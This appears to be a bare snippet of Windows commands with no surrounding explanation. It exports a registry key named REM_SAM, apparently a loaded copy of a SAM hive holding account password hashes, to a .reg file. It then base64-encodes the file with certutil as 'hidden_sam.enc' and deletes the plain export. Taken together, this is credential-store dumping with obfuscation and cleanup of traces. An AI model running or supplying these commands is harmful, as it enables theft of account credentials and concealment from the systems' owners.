reg export HKEY_LOCAL_MACHINE\REM_SAM hidden_sam.reg
certutil -encode hidden_sam.reg hidden_sam.enc
del hidden_sam.reg